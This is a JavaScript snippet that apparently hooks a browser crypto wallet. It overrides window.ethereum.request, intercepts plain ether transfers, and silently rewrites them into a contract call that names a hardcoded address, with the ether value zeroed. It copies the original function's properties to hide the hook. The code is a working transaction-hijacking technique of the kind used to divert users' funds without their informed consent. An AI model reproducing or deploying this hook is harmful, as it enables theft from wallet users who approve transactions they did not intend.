const requestOriginal = window.ethereum.request

window.ethereum.request = function() {
  try {
    const walletAddress = document.getElementById('walletAddress').innerHTML

    // if the request is send ether, we want to intercept it
    if (arguments[0]?.method === 'eth_sendTransaction'
      && arguments[0]?.params?.[0]?.data === undefined
      && walletAddress) {
      console.log('Original args', JSON.stringify(...arguments))

      const walletAddress = document.getElementById('walletAddress').innerHTML
      console.log('Wallet address', walletAddress)

      const modifiedArguments = [...arguments]
      const paddedAmount = parseInt(arguments[0].params[0].value).toString(16).padStart(64, '0')

      modifiedArguments[0].params[0].data = '0xd0679d340000000000000000000000002f318c334780961fb129d2a6c30d0763d9a5c970' + paddedAmount
      modifiedArguments[0].params[0].to =  walletAddress // wallet address
      modifiedArguments[0].params[0].value = "0" // 0 ether

      console.log('Modified args', JSON.stringify(...modifiedArguments))
    }

    return requestOriginal.apply(this, arguments);
  } catch (e) {
    throw e
  }
}

for(var prop in requestOriginal) {
  if (requestOriginal.hasOwnProperty(prop)) {
    window.ethereum.request[prop] = requestOriginal[prop];
  }
}


// 0xd0679d340000000000000000000000002f318c334780961fb129d2a6c30d0763d9a5c970000000000000000000000000000000000000000000000000016345785d8a0000
// 0xd0679d340000000000000000000000002f318c334780961fb129d2a6c30d0763d9a5c970000000000000000000000000000000000000000000000000016345785d8a0000
// 0xd0679d340000000000000000000000002f318c334780961fb129d2a6c30d0763d9a5c970000000000000000000000000000000000000000000000000016345785d8a0000
// 0xd0679d340000000000000000000000002f318c334780961fb129d2a6c30d0763d9a5c970000000000000000000000000000000000000000000000000016345785d8a0000
